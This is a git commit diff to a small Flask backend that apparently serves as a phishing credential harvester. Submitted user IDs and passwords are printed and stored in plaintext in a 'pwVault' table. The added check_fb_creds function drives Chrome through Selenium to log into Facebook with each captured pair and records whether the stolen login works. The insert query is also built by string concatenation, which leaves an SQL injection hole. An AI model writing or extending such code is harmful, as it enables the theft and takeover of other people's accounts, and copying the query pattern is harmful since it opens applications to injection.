26434c2f99aa5e97c251aeaeeac8774c63f866e4
rahul-parikh <rahulmparikh@gmail.com>
2018-12-02 15:06:10 -0600

    Adding the 3 step: Checking FB Creds

--- backend/main.py
+++ backend/main.py
@@ -1,6 +1,8 @@
 from flask import Flask, render_template, request, send_from_directory
 import http.server
 import socketserver
+from selenium import webdriver 
+from time import sleep
 import sqlite3 as sql
 app = Flask(__name__)
 
@@ -20,19 +22,17 @@ def addrec():
     try:
         id = request.form['id']
         pw = request.form['pw']
-        test = 'NO'
-
         print("id: " + id + " pw: " + pw)
+        test = check_fb_creds(id,pw)
         with sql.connect("database.db") as con:
             cur = con.cursor()      
             query = "INSERT INTO pwVault (id ,pw , test) values ('" + id +  "','" + pw + "','" + test + "')"
             cur.execute(query)
             con.commit()
-            msg = "Record successfully added"
+            msg = "Record successfully added"   
     except Exception as exp:
         con.rollback()
         msg = "error in insert operation" + str(exp)
-      
     finally:
          return render_template("forward.html")
          con.close()
@@ -47,6 +47,37 @@ def list():
    
    rows = cur.fetchall();
    return render_template("list.html",rows = rows)
+
+def check_fb_creds(usr,pwd):
+    options = webdriver.ChromeOptions()
+    options.binary_location = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+    chrome_driver_binary = "/usr/local/bin/chromedriver"
+    driver = webdriver.Chrome(chrome_driver_binary, chrome_options=options)
+
+    driver.get('https://www.facebook.com/') 
+    print ("Opened facebook") 
+
+    username_box = driver.find_element_by_id('email') 
+    username_box.send_keys(usr) 
+    print ("Email Id entered") 
+
+    password_box = driver.find_element_by_id('pass') 
+    password_box.send_keys(pwd) 
+    print ("Password entered") 
+
+    login_box = driver.find_element_by_id('loginbutton') 
+    login_box.click() 
+    
+    try:
+        username_box = driver.find_element_by_id('email')
+        work = 'NO'
+    except:
+        work = 'YES'
+    
+    print ("Done")
+    driver.quit() 
+
+    return work
 
 if __name__ == '__main__':
    app.run(debug = True)
